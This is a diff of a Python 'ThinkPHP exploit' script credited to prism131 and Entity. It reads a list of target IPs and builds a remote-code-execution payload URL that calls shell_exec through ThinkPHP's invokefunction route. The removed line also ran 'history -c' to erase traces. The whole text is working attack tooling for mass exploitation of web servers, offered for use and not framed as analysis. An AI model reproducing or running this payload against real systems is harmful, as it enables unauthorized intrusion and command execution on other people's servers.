@@ -1,5 +1,5 @@
 #!/usr/bin/python
-# ThinkPHP exploit loader by prism131 and Entity
+# ThinkPHP exploit by prism131 and Entity
 
 import threading, sys, time, random, socket, subprocess, re, os, struct, array, requests
 from threading import Thread
@@ -8,8 +8,8 @@ import requests
 from requests.auth import HTTPDigestAuth
 from decimal import *
 ips = open(sys.argv[1], "r").readlines()
-cmd = "/tmp/; SHELL_COMMAND_HERE; history -c"
-payload = "public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cd%20"+cmd+""
+cmd = "SHELL_COMMAND"
+payload = "public/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]="+cmd+""
 
 class load(threading.Thread):
   def __init__ (self, ip):
